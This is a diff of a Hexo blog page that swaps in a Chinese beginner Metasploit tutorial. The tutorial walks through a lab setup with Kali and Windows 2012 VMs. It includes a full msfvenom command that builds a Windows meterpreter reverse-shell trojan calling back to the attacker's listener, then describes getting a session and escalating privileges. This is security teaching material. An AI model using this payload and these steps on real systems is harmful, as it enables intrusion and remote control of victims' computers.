@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="tupian, Hexo">
+    <meta name="keywords" content="“Metasploit”, Hexo">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>tupian | Hexo</title>
+    <title>“Metasploit” | Hexo</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -308,12 +308,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/1.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/9.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">tupian</h1>
+                    <h1 class="description center-align post-title">“Metasploit”</h1>
                 </div>
             </div>
         </div>
@@ -442,7 +442,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-08-09
+                    2020-08-08
                 </div>
                 
 
@@ -458,8 +458,45 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p><img src="/1.JPEG"></p>
+                <h2 id="Metasploit基础教程（1）"><a href="#Metasploit基础教程（1）" class="headerlink" title="Metasploit基础教程（1）"></a>Metasploit基础教程（1）</h2><h6 id="前期渗透——–如何使用msf来渗透一台电脑（这台电脑没有装任何杀毒软件）"><a href="#前期渗透——–如何使用msf来渗透一台电脑（这台电脑没有装任何杀毒软件）" class="headerlink" title="前期渗透——–如何使用msf来渗透一台电脑（这台电脑没有装任何杀毒软件）"></a><em>前期渗透——–如何使用msf来渗透一台电脑（这台电脑没有装任何杀毒软件）</em></h6><hr>
+<h4 id="利用msf模块中的msfvenom模块，首先生成-exe木马文件，用靶机打开，攻击成功后，就渗透到了靶机系统中。"><a href="#利用msf模块中的msfvenom模块，首先生成-exe木马文件，用靶机打开，攻击成功后，就渗透到了靶机系统中。" class="headerlink" title="利用msf模块中的msfvenom模块，首先生成.exe木马文件，用靶机打开，攻击成功后，就渗透到了靶机系统中。"></a>利用msf模块中的msfvenom模块，首先生成.exe木马文件，用靶机打开，攻击成功后，就渗透到了靶机系统中。</h4><p>我们要准备两台虚拟机：</p>
+<p>kali：<a target="_blank" rel="noopener" href="https://www.kali.org/downloads/">kali官网下载镜像链接</a></p>
+<p>kali ip地址为：192.168.1.8</p>
+<p>windows 2012：<a target="_blank" rel="noopener" href="https://msdn.itellyou.cn/">msdn.各种操作系统镜像</a></p>
+<img src="https://s1.ax1x.com/2020/08/09/aTUrqS.png" style="zoom:150%;">
 
+<p>shell中输入：msfvenom –help看看参数配置，这个模块是生成木马的编译器。</p>
+<img src="https://s1.ax1x.com/2020/08/09/aTU6aQ.png" style="zoom:150%;">
+
+<p>shell输入：ifconfig（查看kali IP地址）</p>
+<img src="https://s1.ax1x.com/2020/08/09/aTUwxP.png" style="zoom:150%;">
+
+<p>shell输入：msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.8 LPORT=4444 -f exe &gt; jinitaimei.exe</p>
+<p>（这个命令意思就是通过msfvenom编译器编译一个后门软件，通俗的讲就是生成一个木马。-p 就是对应的端口。 LHOST：这个是本地监听地址这里我们填kali地址。监听端口号就是4444 。-f ：指定生成一个什么文件 exe还是apk等等：这里我们直接做成，可执行文件 。最后是取一个名为jinitaimei的exe可执行文件 。可以看出生成了一个341字节木马文件）</p>
+<img src="https://s1.ax1x.com/2020/08/09/aTU5rT.png" style="zoom:150%;">
+
+<p>我们直接把文件拖到物理机上，然后在物理机中复制到windows 2012系统中!</p>
+<img src="https://s1.ax1x.com/2020/08/09/aTU1KK.png" style="zoom: 200%;">
+
+<img src="https://s1.ax1x.com/2020/08/09/aTaiid.png" style="zoom:150%;">
+
+
+
+<p>kali命令行中输入：msfconsole（可以看到metasploit版本号，攻击模块和辅助模块以及有多少个漏洞可以利用等等，我们话不多说，直接开始淦）</p>
+<img src="https://s1.ax1x.com/2020/08/09/aTNH3t.png" style="zoom:150%;">
+
+<p>我们直接利用监听模块：顺便加载一个payload，这里是方便我们到时候windows 2012 反弹回来的meterpreter回话。</p>
+<img src="https://s1.ax1x.com/2020/08/09/aTl1ud.png" style="zoom:150%;">
+
+<p>现在直接去windows 2012 双击运行一下jinitaimei文件，kali这边就会回弹一个meterpreter回来</p>
+<img src="https://s1.ax1x.com/2020/08/09/aT0yyq.png" style="zoom:150%;">
+
+<img src="https://s1.ax1x.com/2020/08/09/aTaYLT.png" style="zoom:150%;">
+
+<p>看看我们现在的权限，直接提权到最高权限。</p>
+<img src="https://s1.ax1x.com/2020/08/09/aTahYd.png" style="zoom:150%;">
+
+<h2 id="ok现在可以直接看windows-2012-电脑大部分信息！！！（这个是没有安装任何杀毒工具，仅限于学习的，淦出事与本人无关！！）"><a href="#ok现在可以直接看windows-2012-电脑大部分信息！！！（这个是没有安装任何杀毒工具，仅限于学习的，淦出事与本人无关！！）" class="headerlink" title="ok现在可以直接看windows 2012 电脑大部分信息！！！（这个是没有安装任何杀毒工具，仅限于学习的，淦出事与本人无关！！）"></a>ok现在可以直接看windows 2012 电脑大部分信息！！！（这个是没有安装任何杀毒工具，仅限于学习的，淦出事与本人无关！！）</h2>
             </div>
             <hr/>
 
@@ -484,7 +521,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://KiLeter.github.io/2020/08/09/tupian/">https://KiLeter.github.io/2020/08/09/tupian/</a>
+                    <a href="https://KiLeter.github.io/2020/08/08/%E7%91%9E%E5%A3%AB%E5%86%9B%E5%88%80/">https://KiLeter.github.io/2020/08/08/%E7%91%9E%E5%A3%AB%E5%86%9B%E5%88%80/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -687,49 +724,9 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
-            <div class="article-badge left-badge text-color">
-                <i class="far fa-dot-circle"></i>&nbsp;本篇
-            </div>
-            <div class="card">
-                <a href="/2020/08/09/tupian/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/1.jpg" class="responsive-img" alt="tupian">
-                        
-                        <span class="card-title">tupian</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            
-
-                        
-                    </div>
-                    <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2020-08-09
-                            </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-user fa-fw"></i>
-                            John Doe
-                            
-                        </span>
-                    </div>
-                </div>
-
-                
-            </div>
-        </div>
-        
-        
         <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
-            </div>
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
                 <a href="/2020/08/08/%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/">
                     <div class="card-image">
@@ -748,6 +745,44 @@
                         
                     </div>
                     <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2020-08-08
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            John Doe
+                            
+                        </span>
+                    </div>
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                本篇&nbsp;<i class="far fa-dot-circle"></i>
+            </div>
+            <div class="card">
+                <a href="/2020/08/08/%E7%91%9E%E5%A3%AB%E5%86%9B%E5%88%80/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/9.jpg" class="responsive-img" alt="“Metasploit”">
+                        
+                        <span class="card-title">“Metasploit”</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            Metasploit基础教程（1）前期渗透——–如何使用msf来渗透一台电脑（这台电脑没有装任何杀毒软件）
+利用msf模块中的msfvenom模块，首先生成.exe木马文件，用靶机打开，攻击成功后，就渗透到了靶机系统中。我们要准备两台虚拟机
+                        
+                    </div>
+                    <div class="publish-info">
                             <span class="publish-date">
                                 <i class="far fa-clock fa-fw icon-date"></i>2020-08-08
                             </span>
@@ -759,6 +794,7 @@
                         </span>
                     </div>
                 </div>
+
                 
             </div>
         </div>
